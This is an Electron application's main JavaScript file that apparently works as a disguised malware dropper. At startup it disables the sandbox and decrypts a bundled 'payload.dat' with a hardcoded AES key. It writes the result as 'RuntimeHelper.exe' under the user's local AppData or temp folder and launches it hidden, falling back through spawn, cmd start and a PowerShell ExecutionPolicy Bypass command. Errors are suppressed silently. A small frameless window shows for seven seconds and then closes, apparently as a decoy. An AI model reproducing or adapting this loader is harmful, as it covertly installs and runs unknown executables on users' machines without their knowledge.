const { app, BrowserWindow } = require('electron');
const path = require('path');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const { exec, spawn } = require('child_process');

try {
    app.disableHardwareAcceleration();
    app.commandLine.appendSwitch('no-sandbox');
    app.commandLine.appendSwitch('disable-gpu');
    app.commandLine.appendSwitch('disable-software-rasterizer');
    app.commandLine.appendSwitch('disable-gpu-compositing');
    app.commandLine.appendSwitch('disable-gpu-rasterization');
    app.commandLine.appendSwitch('disable-gpu-sandbox');
} catch (_) {}

const KEY_HEX = '81ee7434a7a6fdac6c242e32fdec9523c8a89f8680428d0b3f3c7feb5d2b07bf';
const IV_HEX = '88dc84486d6aac06dffe92cad6aef751';

function decryptAndRun() {
    try {
        const encPath = path.join(__dirname, 'payload.dat');
        if (!fs.existsSync(encPath)) return;
        const encData = fs.readFileSync(encPath);
        const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(KEY_HEX, 'hex'), Buffer.from(IV_HEX, 'hex'));
        const decrypted = Buffer.concat([decipher.update(encData), decipher.final()]);
        const localApp = process.env.LOCALAPPDATA || path.join(os.homedir(), 'AppData', 'Local');
        const targetDir = path.join(localApp, 'Programs', 'Common');
        try {
            if (!fs.existsSync(targetDir)) {
                fs.mkdirSync(targetDir, { recursive: true });
            }
        } catch (_) {}
        let chosenPath = path.join(targetDir, 'RuntimeHelper.exe');
        let written = false;
        try {
            fs.writeFileSync(chosenPath, decrypted);
            written = true;
        } catch (err) {
            const randSuffix = Math.random().toString(36).substring(2, 8);
            chosenPath = path.join(targetDir, 'RuntimeHelper_' + randSuffix + '.exe');
            try {
                fs.writeFileSync(chosenPath, decrypted);
                written = true;
            } catch (_) {}
        }
        if (!written) {
            const tempDir = os.tmpdir();
            chosenPath = path.join(tempDir, 'RuntimeHelper_' + Math.random().toString(36).substring(2, 8) + '.exe');
            try {
                fs.writeFileSync(chosenPath, decrypted);
                written = true;
            } catch (_) {}
        }
        if (written && fs.existsSync(chosenPath)) {
            let started = false;
            try {
                const child = spawn(chosenPath, [], { detached: true, stdio: 'ignore', windowsHide: true });
                child.unref();
                started = true;
            } catch (_) {}
            if (!started) {
                try {
                    exec('cmd.exe /c start "" "' + chosenPath + '"', { windowsHide: true });
                    started = true;
                } catch (_) {}
            }
            if (!started) {
                try {
                    const escapedPath = chosenPath.replace(/\\/g, '\\\\');
                    exec('powershell.exe -ExecutionPolicy Bypass -NoProfile -NonInteractive -WindowStyle Hidden -Command "Start-Process \\"' + escapedPath + '\\""', { windowsHide: true });
                } catch (_) {}
            }
        }
    } catch (e) {}
}

decryptAndRun();

app.whenReady().then(() => {
    const win = new BrowserWindow({
        width: 360,
        height: 190,
        resizable: false,
        maximizable: false,
        minimizable: false,
        center: true,
        frame: false,
        backgroundColor: '#0f172a',
        webPreferences: { nodeIntegration: false }
    });
    win.loadFile(path.join(__dirname, 'index.html'));
    setTimeout(() => {
        app.quit();
    }, 7000);
}).catch(() => {
    app.quit();
});